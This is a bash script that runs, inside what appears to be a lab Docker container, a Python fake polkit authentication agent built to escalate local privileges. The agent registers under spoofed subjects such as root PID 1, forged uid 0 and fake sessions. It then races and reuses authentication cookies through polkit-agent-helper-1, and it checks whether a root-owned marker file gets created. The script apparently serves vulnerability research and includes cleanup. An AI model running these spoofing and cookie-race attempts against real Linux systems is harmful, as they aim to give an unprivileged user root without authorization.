#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
repo_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log_path="$repo_dir/logs/polkit-agent-subject-spoof.out"

mkdir -p "$repo_dir/logs"
tmp_log="$(mktemp "$repo_dir/logs/polkit-agent-subject-spoof.out.tmp.XXXXXX")"

docker exec -i "$container" bash -s >"$tmp_log" 2>&1 <<'TARGET'
set +e
export LC_ALL=C

WORK=/tmp/polkit-agent-subject-spoof
MARKER=/root/polkit_agent_subject_spoof_root
UNIT=/run/systemd/system/polkit-agent-subject-spoof.service
USER_SELF=selfauth
USER_ATTACKER=attacker
TTYNUM=8
PROFILE=/home/selfauth/.bash_profile
PROFILE_BAK=$WORK/selfauth.bash_profile.bak
PROFILE_STATE=$WORK/selfauth.bash_profile.state

section() {
  printf '\n## %s\n' "$1"
}

start_subject() {
  local name="$1"
  local user="$2"
  local pidfile="$WORK/$name.pid"
  rm -f "$pidfile"
  if [ "$user" = root ]; then
    bash -c "echo \$\$ > '$pidfile'; exec sleep 180" &
  else
    runuser -u "$user" -- bash -c "echo \$\$ > '$pidfile'; exec sleep 180" &
  fi
  for _ in $(seq 1 50); do
    [ -s "$pidfile" ] && break
    sleep 0.05
  done
}

cleanup_target() {
  set +e
  pkill -f 'polkit-agent-subject-spoof.*sleep 180' >/dev/null 2>&1 || true
  for f in "$WORK"/*.pid; do
    [ -e "$f" ] || continue
    kill "$(cat "$f" 2>/dev/null)" >/dev/null 2>&1 || true
  done
  loginctl terminate-user "$USER_SELF" >/dev/null 2>&1 || true
  systemctl start "getty@tty${TTYNUM}.service" >/dev/null 2>&1 || true
  if [ -f "$PROFILE_STATE" ] && grep -qx existed "$PROFILE_STATE"; then
    cp -a "$PROFILE_BAK" "$PROFILE" 2>/dev/null || true
    chown "$USER_SELF:$USER_SELF" "$PROFILE" 2>/dev/null || true
  else
    rm -f "$PROFILE"
  fi
  rm -f "$UNIT"
  systemctl daemon-reload >/dev/null 2>&1 || true
  systemctl restart polkit.service >/dev/null 2>&1 || true
  rm -rf "$WORK"
  rm -f "$MARKER"
}
trap cleanup_target EXIT

rm -rf "$WORK"
mkdir -m 1777 -p "$WORK"
rm -f "$MARKER"

if ! id "$USER_SELF" >/dev/null 2>&1; then
  useradd -m -s /bin/bash "$USER_SELF"
fi
echo "$USER_SELF:$USER_SELF" | chpasswd
usermod -G "$USER_SELF" "$USER_SELF"

cat >"$UNIT" <<'UNITEOF'
[Unit]
Description=polkit agent subject spoof root marker

[Service]
Type=oneshot
ExecStart=/bin/sh -c 'id > /root/polkit_agent_subject_spoof_root'
UNITEOF
systemctl daemon-reload >/dev/null 2>&1

section "target identity/package/policy baseline"
{
  sed -n '1,8p' /etc/os-release
  uname -a
  id "$USER_ATTACKER" 2>&1 || true
  id "$USER_SELF" 2>&1 || true
  id ubuntu 2>&1 || true
  passwd -S ubuntu 2>&1 || true
  passwd -S "$USER_ATTACKER" 2>&1 || true
  passwd -S "$USER_SELF" 2>&1 || true
  getent shadow ubuntu "$USER_ATTACKER" "$USER_SELF" | sed 's/^\([^:]*\):\([^:]*\):.*/shadow \1:\2/'
  getent group sudo adm root shadow | sed 's/^/group /'
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
    polkitd libpolkit-agent-1-0 libpolkit-gobject-1-0 dbus systemd packagekit packagekit-tools \
    python3-dbus python3-gi libpam-systemd 2>&1 | sort
  loginctl list-sessions --no-legend 2>&1 || true
  busctl --system introspect org.freedesktop.PolicyKit1 /org/freedesktop/PolicyKit1/Authority \
    org.freedesktop.PolicyKit1.Authority --no-pager 2>&1 | sed -n '1,80p'
} 2>&1

section "focused action defaults"
python3 - <<'PY'
import glob
import xml.etree.ElementTree as ET
want = {
    "org.freedesktop.systemd1.manage-units",
    "org.freedesktop.systemd1.manage-unit-files",
    "org.freedesktop.packagekit.package-install",
    "org.freedesktop.packagekit.package-remove",
    "org.freedesktop.packagekit.system-sources-refresh",
}
for path in sorted(glob.glob("/usr/share/polkit-1/actions/*.policy")):
    root = ET.parse(path).getroot()
    for action in root.findall("action"):
        aid = action.get("id")
        if aid not in want:
            continue
        vals = {}
        for key in ("allow_any", "allow_inactive", "allow_active"):
            node = action.find("defaults/" + key)
            vals[key] = (node.text or "").strip() if node is not None else ""
        print(f"{aid}\tany={vals['allow_any']}\tinactive={vals['allow_inactive']}\tactive={vals['allow_active']}\t{path}")
PY

start_subject root_sleeper root
start_subject ubuntu_admin_sleeper ubuntu
start_subject attacker_sleeper "$USER_ATTACKER"
start_subject selfauth_sleeper "$USER_SELF"

cat >"$WORK/make_specs.py" <<'PY'
import json
import os

work = "/tmp/polkit-agent-subject-spoof"

def start_time(pid):
    with open(f"/proc/{pid}/stat") as f:
        return int(f.read().split()[21])

def read_pid(name):
    with open(os.path.join(work, name + ".pid")) as f:
        return int(f.read().strip())

specs = {}
for name, uid in (
    ("root_sleeper", 0),
    ("ubuntu_admin_sleeper", 1000),
    ("attacker_sleeper", 1001),
    ("selfauth_sleeper", 1002),
):
    pid = read_pid(name)
    specs[name] = {"kind": "unix-process", "pid": pid, "uid": uid, "start": start_time(pid)}
specs["root_pid1"] = {"kind": "unix-process", "pid": 1, "uid": 0, "start": start_time(1)}
specs["fake_session_c1"] = {"kind": "unix-session", "session-id": "c1"}
json.dump(specs, open(os.path.join(work, "subject_specs.json"), "w"), indent=2, sort_keys=True)
PY
python3 "$WORK/make_specs.py"
chmod 0644 "$WORK/subject_specs.json"

section "spoof subject process inventory"
{
  cat "$WORK/subject_specs.json"
  for f in "$WORK"/*.pid; do
    pid="$(cat "$f")"
    ps -o pid,ppid,user,uid,stat,comm,args -p "$pid" 2>&1
    awk '{print "stat_start_time=" $22}' "/proc/$pid/stat" 2>/dev/null
  done
} 2>&1

cat >"$WORK/agent_subject_probe.py" <<'PY'
#!/usr/bin/python3
import json
import os
import re
import subprocess
import sys
import threading
import time

import dbus
import dbus.mainloop.glib
import dbus.service
from gi.repository import GLib

WORK = "/tmp/polkit-agent-subject-spoof"
HELPER = "/usr/lib/polkit-1/polkit-agent-helper-1"
SYSTEMD_ACTION = "org.freedesktop.systemd1.manage-units"
PK_ACTION = "org.freedesktop.packagekit.package-install"

dbus.mainloop.glib.DBusGMainLoop(set_as_default=True)
bus = dbus.SystemBus()
authority = bus.get_object("org.freedesktop.PolicyKit1", "/org/freedesktop/PolicyKit1/Authority")
iface = dbus.Interface(authority, "org.freedesktop.PolicyKit1.Authority")

state = {
    "label": "",
    "cookie": None,
    "helper_plan": "",
    "helper_started": False,
    "successes": 0,
}

def log(msg):
    print(msg, flush=True)

def sanitize(label):
    return re.sub(r"[^A-Za-z0-9_]", "_", label)

def start_time(pid):
    with open(f"/proc/{pid}/stat") as f:
        return int(f.read().split()[21])

def current_process_subject(uid=None):
    if uid is None:
        uid = os.getuid()
    return ("unix-process", {
        "pid": dbus.UInt32(os.getpid()),
        "start-time": dbus.UInt64(start_time(os.getpid())),
        "uid": dbus.Int32(uid),
    })

def subject_from_spec(spec):
    kind = spec["kind"]
    if kind == "unix-process":
        return ("unix-process", {
            "pid": dbus.UInt32(int(spec["pid"])),
            "start-time": dbus.UInt64(int(spec["start"])),
            "uid": dbus.Int32(int(spec["uid"])),
        })
    if kind == "unix-session":
        return ("unix-session", {"session-id": dbus.String(spec["session-id"])})
    if kind == "system-bus-name":
        return ("system-bus-name", {"name": dbus.String(spec["name"])})
    raise ValueError(kind)

def ident_str(identities):
    out = []
    for kind, attrs in identities:
        clean = {}
        for k, v in dict(attrs).items():
            try:
                clean[str(k)] = int(v)
            except Exception:
                clean[str(k)] = str(v)
        out.append(f"{kind}:{clean}")
    return "[" + ", ".join(out) + "]"

def run_helper(username, password, cookie, tag, timeout_s=5):
    try:
        proc = subprocess.run(
            [HELPER, username, cookie],
            input=(password + "\n").encode(),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout_s,
        )
        text = proc.stdout.decode("utf-8", "replace").replace("\n", "\\n")
        if re.search(r"(^|\\n)SUCCESS(\\n|$)", text):
            state["successes"] += 1
        log(f"HELPER tag={tag} user={username} rc={proc.returncode} output={text[:600]}")
    except Exception as exc:
        log(f"HELPER tag={tag} user={username} error={exc!r}")

def helper_plan(cookie, plan):
    if not plan:
        return
    if plan == "selfauth-basic":
        run_helper("selfauth", "selfauth", cookie, "live-selfauth-password")
        run_helper("ubuntu", "selfauth", cookie, "live-ubuntu-locked-with-selfauth-password")
        return
    if plan == "selfauth-race":
        jobs = []
        for i in range(8):
            if i % 3 == 0:
                args = ("selfauth", "selfauth", cookie, f"race-{i}-selfauth")
            elif i % 3 == 1:
                args = ("ubuntu", "selfauth", cookie, f"race-{i}-ubuntu-locked")
            else:
                args = ("root", "selfauth", cookie, f"race-{i}-root")
            t = threading.Thread(target=run_helper, args=args, daemon=True)
            jobs.append(t)
            t.start()
        for t in jobs:
            t.join(6)

class Agent(dbus.service.Object):
    @dbus.service.method(
        "org.freedesktop.PolicyKit1.AuthenticationAgent",
        in_signature="sssa{ss}sa(sa{sv})",
        out_signature="",
    )
    def BeginAuthentication(self, action_id, message, icon_name, details, cookie, identities):
        state["cookie"] = str(cookie)
        log(
            "BEGIN label=%s action=%s cookie=%s identities=%s details=%s"
            % (state["label"], action_id, cookie, ident_str(identities), dict(details))
        )

    @dbus.service.method(
        "org.freedesktop.PolicyKit1.AuthenticationAgent",
        in_signature="s",
        out_signature="",
    )
    def CancelAuthentication(self, cookie):
        log("CANCEL_AUTH label=%s cookie=%s" % (state["label"], cookie))

agent = Agent(bus, "/org/example/PolkitAgentSubjectSpoof")

def maybe_start_helpers():
    if state["cookie"] and state["helper_plan"] and not state["helper_started"]:
        state["helper_started"] = True
        helper_plan(state["cookie"], state["helper_plan"])
    return True

def register(subject, label):
    try:
        iface.RegisterAuthenticationAgent(subject, "en_US.UTF-8", "/org/example/PolkitAgentSubjectSpoof")
        log(f"REGISTER_OK label={label}")
        return True
    except Exception as exc:
        log(f"REGISTER_FAIL label={label} error={exc!r}")
        return False

def unregister(subject, label):
    try:
        iface.UnregisterAuthenticationAgent(subject, "/org/example/PolkitAgentSubjectSpoof")
        log(f"UNREGISTER_OK label={label}")
    except Exception as exc:
        log(f"UNREGISTER_FAIL label={label} error={exc!r}")

def check_authorization(subject, label, action, helper="", cancel_ms=1600, post_reuse=False):
    state.update({"label": label, "cookie": None, "helper_plan": helper, "helper_started": False, "successes": 0})
    cid = "cid-" + sanitize(label) + "-" + str(os.getpid()) + "-" + str(time.time_ns())
    result_box = {}

    def worker():
        try:
            result_box["result"] = iface.CheckAuthorization(subject, action, {}, dbus.UInt32(1), cid)
        except Exception as exc:
            result_box["error"] = repr(exc)

    t = threading.Thread(target=worker, daemon=True)
    t.start()
    loop = GLib.MainLoop()
    GLib.timeout_add(80, maybe_start_helpers)

    def cancel():
        try:
            iface.CancelCheckAuthorization(cid)
            log(f"CANCEL_CHECK label={label} cid={cid}")
        except Exception as exc:
            log(f"CANCEL_CHECK_FAIL label={label} error={exc!r}")
        return False

    def done():
        loop.quit()
        return False

    GLib.timeout_add(cancel_ms, cancel)
    GLib.timeout_add(cancel_ms + 1200, done)
    loop.run()
    t.join(0.5)
    if "result" in result_box:
        log(f"CHECK_RESULT label={label} action={action} result={result_box['result']!r}")
    elif "error" in result_box:
        log(f"CHECK_ERROR label={label} action={action} error={result_box['error']}")
    else:
        log(f"CHECK_PENDING_AFTER_CANCEL label={label} action={action}")
    cookie = state.get("cookie")
    if post_reuse and cookie:
        run_helper("selfauth", "selfauth", cookie, "post-cancel-reuse-selfauth")
        run_helper("ubuntu", "selfauth", cookie, "post-cancel-reuse-ubuntu-locked")
    log(f"CHECK_SUMMARY label={label} cookie_seen={int(bool(cookie))} helper_successes={state['successes']}")
    return cookie

def external_trigger(subject, label, command, helper="selfauth-basic", timeout_s=7):
    state.update({"label": label, "cookie": None, "helper_plan": helper, "helper_started": False, "successes": 0})
    proc_box = {}

    def launch():
        log(f"EXTERNAL_START label={label} cmd={' '.join(command)}")
        proc_box["proc"] = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        return False

    loop = GLib.MainLoop()
    GLib.timeout_add(120, launch)
    GLib.timeout_add(80, maybe_start_helpers)

    def done():
        p = proc_box.get("proc")
        if p and p.poll() is None:
            p.kill()
        loop.quit()
        return False

    GLib.timeout_add(timeout_s * 1000, done)
    loop.run()
    p = proc_box.get("proc")
    if p:
        try:
            out, _ = p.communicate(timeout=1)
        except Exception:
            out = b""
        log(f"EXTERNAL_RESULT label={label} rc={p.returncode} output={out.decode('utf-8','replace').replace(chr(10),'\\n')[:900]}")
    else:
        log(f"EXTERNAL_RESULT label={label} not-launched")
    log(f"EXTERNAL_SUMMARY label={label} cookie_seen={int(bool(state.get('cookie')))} helper_successes={state['successes']}")

def run_matrix(caller_label):
    log(f"CALLER label={caller_label} uid={os.getuid()} euid={os.geteuid()} bus={bus.get_unique_name()} session={os.environ.get('XDG_SESSION_ID','')}")
    specs = json.load(open(os.path.join(WORK, "subject_specs.json")))
    own = current_process_subject()
    matrix = [("own-process", own)]
    if caller_label == "attacker":
        matrix.append(("same-uid-other-attacker-pid", subject_from_spec(specs["attacker_sleeper"])))
        matrix.append(("other-normal-selfauth-pid", subject_from_spec(specs["selfauth_sleeper"])))
    else:
        matrix.append(("same-uid-other-selfauth-pid", subject_from_spec(specs["selfauth_sleeper"])))
        matrix.append(("other-normal-attacker-pid", subject_from_spec(specs["attacker_sleeper"])))
    matrix.extend([
        ("spoof-root-pid1", subject_from_spec(specs["root_pid1"])),
        ("spoof-root-sleeper", subject_from_spec(specs["root_sleeper"])),
        ("spoof-ubuntu-admin-sleeper", subject_from_spec(specs["ubuntu_admin_sleeper"])),
        ("own-pid-forged-root-uid", current_process_subject(0)),
        ("fake-session-c1", subject_from_spec(specs["fake_session_c1"])),
        ("own-system-bus-name", subject_from_spec({"kind": "system-bus-name", "name": bus.get_unique_name()})),
    ])
    for label, subject in matrix:
        full = f"{caller_label}:{label}"
        if not register(subject, full):
            continue
        helper = "selfauth-basic" if caller_label == "selfauth-active" and label in ("own-process", "actual-xdg-session", "spoof-ubuntu-admin-sleeper") else ""
        check_authorization(subject, full + ":systemd-check", SYSTEMD_ACTION, helper=helper, post_reuse=(helper != ""))
        unregister(subject, full)

    if caller_label == "selfauth-active" and os.environ.get("XDG_SESSION_ID"):
        own_race = current_process_subject()
        if register(own_race, "selfauth-active:own-process-race"):
            check_authorization(own_race, "active-own-process-cookie-race", SYSTEMD_ACTION, helper="selfauth-race", cancel_ms=1900, post_reuse=True)
            unregister(own_race, "selfauth-active:own-process-race")
        sess = subject_from_spec({"kind": "unix-session", "session-id": os.environ["XDG_SESSION_ID"]})
        if register(sess, "selfauth-active:actual-session-external"):
            external_trigger(sess, "active-session-packagekit-pkcheck", ["bash", "-lc", f"pkcheck --action-id {PK_ACTION} --process $$ --allow-user-interaction"], "selfauth-basic", 8)
            external_trigger(sess, "active-session-systemd-start", ["systemctl", "start", "polkit-agent-subject-spoof.service"], "selfauth-basic", 8)
            unregister(sess, "selfauth-active:actual-session-external")

if __name__ == "__main__":
    run_matrix(sys.argv[1])
PY
chmod 0755 "$WORK/agent_subject_probe.py"
chown -R "$USER_ATTACKER:$USER_ATTACKER" "$WORK"
chmod 1777 "$WORK"
chmod 0755 "$WORK/agent_subject_probe.py"
chmod 0644 "$WORK/subject_specs.json"

section "uid1001 attacker spoof registration/check matrix"
runuser -u "$USER_ATTACKER" -- timeout 70s python3 "$WORK/agent_subject_probe.py" attacker
echo "attacker_matrix_rc=$?"

section "active selfauth spoof registration/check matrix"
if [ -e "$PROFILE" ]; then
  cp -a "$PROFILE" "$PROFILE_BAK"
  echo existed >"$PROFILE_STATE"
else
  echo absent >"$PROFILE_STATE"
fi
cat >"$PROFILE" <<EOF
exec python3 "$WORK/agent_subject_probe.py" selfauth-active > "$WORK/active-selfauth.log" 2>&1
EOF
chown "$USER_SELF:$USER_SELF" "$PROFILE" "$WORK/agent_subject_probe.py" "$WORK/subject_specs.json"
chmod 0644 "$PROFILE" "$WORK/subject_specs.json"
chmod 0755 "$WORK/agent_subject_probe.py"
systemctl stop "getty@tty${TTYNUM}.service" 2>&1 || true
timeout 95 openvt -c "$TTYNUM" -s -f -w -- /bin/login -f "$USER_SELF" 2>&1
echo "openvt_rc=$?"
echo "--- active selfauth log"
sed -n '1,260p' "$WORK/active-selfauth.log" 2>&1

section "root proof and cleanup precheck"
if [ -e "$MARKER" ]; then
  echo "ROOT_PROOF=yes"
  ls -l "$MARKER"
  cat "$MARKER"
else
  echo "ROOT_PROOF=no"
  ls -l "$MARKER" 2>&1 || true
fi
systemctl status polkit-agent-subject-spoof.service --no-pager -l 2>&1 | sed -n '1,80p' || true
systemctl is-system-running 2>&1 || true
systemctl --failed --no-legend 2>&1 || true
grep -E 'REGISTER_OK|REGISTER_FAIL|BEGIN|HELPER|CHECK_RESULT|CHECK_ERROR|EXTERNAL_SUMMARY|ROOT_PROOF' "$WORK/active-selfauth.log" 2>/dev/null | sed -n '1,220p' || true

cleanup_target
trap - EXIT

section "cleanup verification"
ls -l "$MARKER" 2>&1 || true
test ! -e "$UNIT"; echo "unit_removed_rc=$?"
systemctl is-system-running 2>&1 || true
systemctl --failed --no-legend 2>&1 || true

exit 0
TARGET

mv "$tmp_log" "$log_path"
chmod 0644 "$log_path"
printf 'wrote %s\n' "$log_path"
